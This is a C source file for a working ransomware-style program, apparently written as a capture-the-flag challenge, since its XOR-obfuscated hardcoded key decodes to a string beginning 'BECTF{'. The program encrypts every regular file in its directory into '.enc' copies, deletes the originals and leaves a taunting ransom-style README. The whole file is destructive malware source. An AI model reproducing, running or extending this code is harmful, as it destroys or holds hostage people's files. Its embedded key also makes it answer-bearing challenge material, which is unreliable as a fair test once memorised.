#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>  
#include <sys/stat.h>    
#include <unistd.h>      
#include <limits.h>      

void derive_master_key(char *out_key) {
    // Payload dari generate_key.py (tetap sama)
    unsigned char payload[] = {
        0x17, 0x10, 0x10, 0x16, 0x1, 0x13, 0x2e, 0x21, 0x3d, 0x64, 0x26, 0xa, 0x64,
        0x26, 0xa, 0x3b, 0x65, 0x21, 0xa, 0x34, 0xa, 0x31, 0x66, 0x36, 0x65, 0x2c,
        0xa, 0x76, 0x27, 0x30, 0x34, 0x39, 0x33, 0x39, 0x34, 0x32, 0xa, 0x76, 0x36,
        0x3a, 0x3b, 0x32, 0x27, 0x34, 0x21, 0x20, 0x39, 0x34, 0x21, 0x3c, 0x3a, 0x3b,
        0x2c, 0x3a, 0x20, 0x32, 0x3a, 0x21, 0x21, 0x3d, 0x30, 0x33, 0x39, 0x34, 0x32,
        0x74, 0x74, 0x74, 0x28
    };
    int len = sizeof(payload);

    for (int i = 0; i < len; i++) {
        out_key[i] = payload[i] ^ 0x55;
    }
    out_key[len] = '\0';
}

void encrypt_payload(FILE *in, FILE *out, char *key) {
    int key_len = strlen(key);
    int ch;
    int i = 0;

    while ((ch = fgetc(in)) != EOF) {
        unsigned char encrypted_byte = (ch ^ key[i % key_len]) + (i % 255);
        encrypted_byte = encrypted_byte ^ 0x33;
        encrypted_byte = encrypted_byte + 0x05;
        fputc(encrypted_byte, out);
        i++;
    }
}

int main(int argc, char *argv[]) {
    char prog_path[PATH_MAX];
    if (realpath(argv[0], prog_path) == NULL) {
        strncpy(prog_path, argv[0], PATH_MAX - 1);
        prog_path[PATH_MAX - 1] = '\0';
    }

    char *prog_copy = strdup(prog_path);
    char *prog_name = NULL;
    char *prog_dir = NULL;

    char *last_slash = strrchr(prog_copy, '/');
    if (last_slash) {
        prog_name = last_slash + 1;      
        *last_slash = '\0';            
        prog_dir = prog_copy;
    } else {
        prog_name = prog_copy;
        prog_dir = ".";
    }

    if (chdir(prog_dir) != 0) {
        perror("chdir");
    }

    char master_key[64] = {0};
    derive_master_key(master_key);

    DIR *dir = opendir(".");
    if (!dir) {
        perror("opendir");
        free(prog_copy);
        return 1;
    }

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        if (prog_name && strcmp(entry->d_name, prog_name) == 0)
            continue;

        struct stat st;
        if (stat(entry->d_name, &st) != 0)
            continue;
        if (!S_ISREG(st.st_mode))
            continue;

        size_t len = strlen(entry->d_name);
        if (len > 4 && strcmp(entry->d_name + len - 4, ".enc") == 0)
            continue;

        FILE *fp = fopen(entry->d_name, "rb");
        if (!fp) {
            perror("fopen input");
            continue;
        }

        char out_name[PATH_MAX];
        snprintf(out_name, sizeof(out_name), "%s.enc", entry->d_name);

        FILE *fp_out = fopen(out_name, "wb");
        if (!fp_out) {
            perror("fopen output");
            fclose(fp);
            continue;
        }

        encrypt_payload(fp, fp_out, master_key);

        fclose(fp);
        fclose(fp_out);

        if (remove(entry->d_name) != 0) {
            perror("remove");
        }
    }

    closedir(dir);

    FILE *readme = fopen("README.txt", "w");
    if (readme) {
        fprintf(readme, "Oops! All your secret files have been encrypted. Don't bother looking for the malware, I already wiped the binary from this disk.\n");
        fclose(readme);
    } else {
        perror("fopen README_HACKED");
    }

    free(prog_copy);
    return 0;
}